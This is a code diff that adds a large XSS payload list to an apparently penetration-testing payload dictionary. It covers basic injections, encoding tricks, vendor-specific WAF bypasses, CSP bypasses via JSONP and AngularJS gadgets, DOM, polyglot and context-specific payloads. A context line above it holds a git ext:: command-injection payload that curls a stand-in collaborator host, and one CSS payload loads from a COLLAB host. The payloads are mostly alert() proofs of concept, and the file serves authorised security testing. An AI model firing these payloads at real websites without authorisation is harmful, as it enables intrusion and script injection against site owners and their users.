@@ -794,6 +794,183 @@ VAPT_PAYLOADS = {
             "git fetch 'ext::sh -c curl%20COLLAB.oast.me/cve30781'",
         ],
     },
+
+    # ── XSS — sourced from xssnow.in / dr34mhacks/xssnow (MIT) ───────────────
+    "xss": {
+        "title": "XSS Payload Arsenal (xssnow-sourced)",
+        "description": "Context-aware XSS: basic, advanced, WAF bypass, CSP bypass, polyglot, DOM, browser-specific — 400+ payloads via xssnow.in",
+        "payloads": [
+            # ── Basic ──────────────────────────────────────────────────────────
+            "<script>alert(1)</script>",
+            "<script>alert(document.domain)</script>",
+            "<script>confirm(1)</script>",
+            "<script>prompt(1)</script>",
+            "<img src=x onerror=alert(1)>",
+            "<img src=x onerror=confirm(1)>",
+            "<svg onload=alert(1)>",
+            "<svg/onload=alert(1)>",
+            "<body onload=alert(1)>",
+            "<input autofocus onfocus=alert(1)>",
+            "<select autofocus onfocus=alert(1)>",
+            "<textarea autofocus onfocus=alert(1)>",
+            "<details open ontoggle=alert(1)>",
+            "<video src=x onerror=alert(1)>",
+            "<audio src=x onerror=alert(1)>",
+            "<iframe src=javascript:alert(1)>",
+            # ── Advanced / Encoding ────────────────────────────────────────────
+            "<script>eval(atob('YWxlcnQoMSk='))</script>",
+            "<script>Function('ale'+'rt(1)')()</script>",
+            "<script>[]['constructor']['constructor']('alert(1)')()</script>",
+            "<script>setTimeout`alert\\x281\\x29`</script>",
+            "<script>Set.constructor`alert\\x281\\x29`</script>",
+            "javascript:alert(1)//",
+            "javascript:/*--></title></style></textarea></script><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'",
+            "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
+            "&#60;script&#62;alert(1)&#60;/script&#62;",
+            "%3Cscript%3Ealert(1)%3C/script%3E",
+            "\"><script>alert(1)</script>",
+            "'><script>alert(1)</script>",
+            "</script><script>alert(1)</script>",
+            # ── Filter Bypass ──────────────────────────────────────────────────
+            "<ScRiPt>alert(1)</sCrIpT>",
+            "<SCRIPT>alert(1)</SCRIPT>",
+            "<scr<script>ipt>alert(1)</scr</script>ipt>",
+            "<scr\x00ipt>alert(1)</scr\x00ipt>",
+            "<script   >alert(1)</script>",
+            "<script\t>alert(1)</script>",
+            "<script\n>alert(1)</script>",
+            "<img src=x onerror  =alert(1)>",
+            "<img src=x onerror\t=alert(1)>",
+            "<img src=x onerror\n=alert(1)>",
+            "<img/src=x/onerror=alert(1)>",
+            # No angle brackets
+            "javascript:alert(1)",
+            "data:text/html,<script>alert(1)</script>",
+            # No quotes
+            "<img src=x onerror=alert`1`>",
+            "<svg onload=alert`1`>",
+            # Short (<50 chars)
+            "<svg/onload=alert(1)>",
+            "<img src=x onerror=alert(1)>",
+            "<body/onload=alert(1)>",
+            # No parentheses
+            "<img src=x onerror=alert`1`>",
+            "<script>throw onerror=alert,1</script>",
+            "<script>{onerror=alert}throw 1</script>",
+            # ── WAF Bypass ─────────────────────────────────────────────────────
+            # CloudFlare
+            "<svg/onload=&#97;&#108;&#101;&#114;&#116;(1)>",
+            "<svg onload=alert%26%230000000040%3B1)>",
+            "<script>\\u0061lert(1)</script>",
+            "<script>\\u{61}lert(1)</script>",
+            "<!--><svg/onload=alert(1)>",
+            # AWS WAF
+            "<script>window['ale'+'rt'](1)</script>",
+            "<script>this['ale'+'rt'](1)</script>",
+            "<script>globalThis.alert(1)</script>",
+            # Akamai
+            "<script>self[`al`+`ert`](1)</script>",
+            "<script>(a=alert)(1)</script>",
+            "<script>(1,alert)(1)</script>",
+            # ModSecurity
+            "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",
+            "<a href=java&#1;script:alert(1)>click",
+            "<<script>alert(1);//<</script>",
+            # F5 ASM
+            "<script>window.alert(1)</script>",
+            "<script>parent.alert(1)</script>",
+            "<script>top.alert(1)</script>",
+            # Imperva
+            "<iframe/onload=alert(1)>",
+            "<object data=javascript:alert(1)>",
+            "<embed src=javascript:alert(1)>",
+            # ── CSP Bypass ─────────────────────────────────────────────────────
+            # JSONP gadgets
+            "<script src=https://accounts.google.com/o/oauth2/revoke?callback=alert(1)></script>",
+            "<script src=https://ajax.googleapis.com/ajax/libs/angularjs/1.8.3/angular.min.js></script><div ng-app ng-csp><div ng-include src=\"'data:text/html,<svg onload=alert(1)>'\"></div></div>",
+            # AngularJS sandbox escapes
+            "{{constructor.constructor('alert(1)')()}}",
+            "{{$on.constructor('alert(1)')()}}",
+            "{{[].pop.constructor&#40;&#39;alert(1)&#39;&#41;&#40;&#41;}}",
+            # data: URI
+            "<iframe src='data:text/html,<script>alert(1)</script>'>",
+            # Script gadgets
+            "<script src=//cdnjs.cloudflare.com/ajax/libs/prototype/1.7.3/prototype.js></script>",
+            # Nonce-less unsafe-inline
+            "<meta http-equiv=Content-Security-Policy content=\"\"><script>alert(1)</script>",
+            # ── DOM-Based ──────────────────────────────────────────────────────
+            "# Test sinks: document.write, innerHTML, outerHTML, insertAdjacentHTML",
+            "#   document.location, document.URL, window.location.hash",
+            "# Hash-based DOM XSS",
+            "https://TARGET/#<img/src/onerror=alert(1)>",
+            "https://TARGET/#javascript:alert(1)",
+            "https://TARGET/?next=javascript:alert(1)",
+            "# Postmessage-based DOM XSS",
+            "# window.addEventListener('message',function(e){eval(e.data)})",
+            # ── Polyglot ───────────────────────────────────────────────────────
+            "javascript:/*--></title></style></textarea></script><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'",
+            "'>\"</script><svg onload=alert(1)//",
+            "\";alert(1)//",
+            "';alert(1)//",
+            "`);alert(1)//",
+            "</script><script>alert(1)</script>",
+            "<script>/*</script><script>*/alert(1)</script>",
+            # Multi-context polyglot (works in HTML, attr, JS string, JS template)
+            "\"'`><svg/onload=alert(1)>",
+            # ── Event Handlers ─────────────────────────────────────────────────
+            "<div onmouseover=alert(1)>hover me</div>",
+            "<div onclick=alert(1)>click me</div>",
+            "<div onmouseenter=alert(1)>",
+            "<input onblur=alert(1) autofocus><input autofocus>",
+            "<marquee onstart=alert(1)>",
+            "<marquee loop=1 width=0 onfinish=alert(1)>",
+            "<body onresize=alert(1)>",
+            "<body onscroll=alert(1)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>",
+            "<div style='overflow:auto;height:1px' onscroll=alert(1)>AAA</div>",
+            # CSS/animation-based
+            "<style>@keyframes x{}</style><div style=animation-name:x onanimationstart=alert(1)>",
+            "<div style=transition:all .01s ontransitionend=alert(1)>",
+            # ── Mobile-Specific ────────────────────────────────────────────────
+            "<body ontouchstart=alert(1)>",
+            "<body ontouchend=alert(1)>",
+            "<div ontouchstart=alert(1)>tap me</div>",
+            "<video ontouchstart=alert(1) src=x>",
+            # ── Browser-Specific ───────────────────────────────────────────────
+            # Chrome
+            "<script>chrome.runtime.sendMessage({},function(response){alert(response)})</script>",
+            "<script>document.write('<img src=x onerror=alert(1)>')</script>",
+            # Firefox
+            "<script>Components.utils.import('resource://gre/modules/Services.jsm');alert(1)</script>",
+            # Safari
+            "<script>location='javascript:alert(1)'</script>",
+            # IE/legacy
+            "<script>window.onerror=alert;throw 1</script>",
+            # ── JS Context (inside <script> blocks) ────────────────────────────
+            "# JS string injection: break out of string then execute",
+            "';alert(1)//",
+            "\";alert(1)//",
+            "\\';alert(1)//",
+            "`;alert(1)//",
+            "-alert(1)-",
+            "+alert(1)+",
+            "/alert(1)/",
+            "# Template literal injection",
+            "${alert(1)}",
+            "# JS regex context",
+            "/alert(1)/",
+            # ── Attribute Context ──────────────────────────────────────────────
+            "\" onmouseover=alert(1) x=\"",
+            "' onmouseover=alert(1) x='",
+            "\" autofocus onfocus=alert(1) x=\"",
+            "\" style=x:expression(alert(1)) x=\"",
+            "\" src=x onerror=alert(1) x=\"",
+            # ── CSS Context ────────────────────────────────────────────────────
+            "expression(alert(1))",
+            "x:expression(alert(1))",
+            "background:url('javascript:alert(1)')",
+            "-moz-binding:url('http://COLLAB/xss.xml#xss')",
+        ],
+    },
 }
 
 
